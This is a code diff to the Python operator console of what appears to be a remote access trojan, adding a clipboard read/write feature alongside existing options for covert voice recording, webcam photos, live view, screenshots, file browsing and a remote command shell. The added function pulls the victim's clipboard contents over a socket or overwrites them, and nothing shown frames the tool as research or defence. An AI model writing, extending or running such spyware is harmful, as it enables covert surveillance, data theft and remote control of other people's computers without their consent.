@@ -9,8 +9,9 @@ from time import sleep
 from platform import system as osType
 from colorama import Fore,Back
 from os.path import isfile
-from os import system
+from os import system , getcwd
 from cryptography.fernet import Fernet
+from random import choice
 def clear():
     if "windows" in osType().lower():
         system("cls")
@@ -188,6 +189,43 @@ def shell(sock,key):
             res=decryptFS(sock.recv(10240),key).decode()
             if not res=="None":
                 print(res)
+def RWclip(sock):
+    clear()
+    selection=input(f"""
+{Fore.LIGHTRED_EX}    ██████╗     ██╗██╗    ██╗
+    ██╔══██╗   ██╔╝██║    ██║
+    ██████╔╝  ██╔╝ ██║ █╗ ██║{Fore.RESET}{Fore.LIGHTCYAN_EX}┌─┐┬  ┬┌─┐┌┐ ┌─┐┌─┐┬─┐┌┬┐
+    {Fore.LIGHTRED_EX}██╔══██╗ ██╔╝  ██║███╗██║{Fore.RESET}{Fore.LIGHTCYAN_EX}│  │  │├─┘├┴┐│ │├─┤├┬┘ ││
+    {Fore.LIGHTRED_EX}██║  ██║██╔╝   ╚███╔███╔╝{Fore.RESET}{Fore.LIGHTCYAN_EX}└─┘┴─┘┴┴  └─┘└─┘┴ ┴┴└──┴┘
+    {Fore.LIGHTRED_EX}╚═╝  ╚═╝╚═╝     ╚══╝╚══╝ {Fore.RESET}
+{Fore.LIGHTMAGENTA_EX}
+    [ 1 ] Read the clipboard    [ 2 ] Write on the clipboard
+
+    [ E ] CTRL+C to exit
+
+    {Fore.LIGHTBLUE_EX}Enter your selection : {Fore.RESET}""")
+    if selection=="1":
+        sock.send(b"GCLPB")
+        data=''
+        while 1:
+            data2=sock.recv(100000).decode()
+            if "ENDeyeRT" in data2:
+                data+=data2.replace("ENDeyeRT",'')
+                break
+            data+=data2
+        input(f"{Fore.LIGHTRED_EX}[ * ] Done : \n\n{Fore.LIGHTGREEN_EX}{data}\n\nEnter to continue :")
+    elif selection=="2":
+        print(f"{Fore.LIGHTYELLOW_EX}[ * ] Enter the data ('ctrl+c' to end) : \n")
+        data=''
+        try:
+            while 1:
+                data+=input("> ")+'\n'
+        except KeyboardInterrupt:
+            pass
+        sock.send(b"WCLPB")
+        sleep(0.5) 
+        sock.send((data.strip()+"ENDeyeRT").encode())
+        input(f"{Fore.LIGHTGREEN_EX}[ * ] Done ...\n\nEnter to continue : ")
 def getFex(sock):
     clear()
     clearBuffer(sock)
@@ -448,15 +486,15 @@ def main(mode):
         {Fore.CYAN}|{Fore.RESET}{Back.RED}____{Back.RESET}|                                                              
        {Fore.CYAN}_|{Fore.RESET}{Back.RED}____{Back.RESET}|_ 
         {Fore.CYAN}/ 00 \_
-      {Fore.CYAN}.'     __0{Fore.RESET}       {Fore.LIGHTGREEN_EX}[ 1 ] Voice recording{Fore.RESET}      {Fore.LIGHTGREEN_EX}[ 5 ] File explorer {Fore.RESET}
+      {Fore.CYAN}.'     __0{Fore.RESET}       {Fore.LIGHTGREEN_EX}[ 1 ] Voice recording{Fore.RESET}          {Fore.LIGHTGREEN_EX}[ 2 ] Take photo{Fore.RESET}
      {Fore.CYAN}/   .-.' \
-    {Fore.CYAN}J    |`.\  \{Fore.RESET}       {Fore.LIGHTGREEN_EX}[ 2 ] Take photo{Fore.RESET}           {Fore.LIGHTGREEN_EX}[ 6 ] CLI remote command shell {Fore.RESET}
+    {Fore.CYAN}J    |`.\  \{Fore.RESET}       {Fore.LIGHTGREEN_EX}[ 3 ] Live{Fore.RESET}                     {Fore.LIGHTGREEN_EX}[ 4 ] Take screenshot {Fore.RESET}
     {Fore.CYAN}| |_.|  | | |
-     {Fore.CYAN}\__.'`.|-' /{Fore.RESET}      {Fore.LIGHTGREEN_EX}[ 3 ] Live{Fore.RESET}                 {Fore.LIGHTGREEN_EX}[ 7 ] Make custom popup box{Fore.RESET}
+     {Fore.CYAN}\__.'`.|-' /{Fore.RESET}      {Fore.LIGHTGREEN_EX}[ 5 ] File explorer {Fore.RESET}           {Fore.LIGHTGREEN_EX}[ 6 ] CLI remote command shell {Fore.RESET}
      {Fore.CYAN}L      `--'\{Fore.RESET}
-    {Fore.CYAN} |           \{Fore.RESET}     {Fore.LIGHTGREEN_EX}[ 4 ] Take screenshot {Fore.RESET}     {Fore.LIGHTGREEN_EX}[ 8 ] Other{Fore.RESET} 
+    {Fore.CYAN} |           \{Fore.RESET}     {Fore.LIGHTGREEN_EX}[ 7 ] Make custom popup box{Fore.RESET}    {Fore.LIGHTGREEN_EX}[ 8 ] Read/write clipboard{Fore.RESET} 
     {Fore.CYAN} J            \{Fore.RESET}
-    {Fore.CYAN}  \         /  \{Fore.RESET}
+    {Fore.CYAN}  \         /  \{Fore.RESET}   {Fore.LIGHTGREEN_EX}[ 9 ] Other{Fore.RESET}                
      {Fore.CYAN}  \      .'`.  `.                                  .'
      ___) /\ (____`.  `-._____________________________.'/
   _///__/__\___\\\_`-.______________________________.-'___
@@ -509,6 +547,8 @@ Enter your selection : """)
             except KeyboardInterrupt:
                 pass
         elif selection=='8':
+            RWclip(sock)
+        elif selection=='9':
             try:
                 others(sock)
             except KeyboardInterrupt:
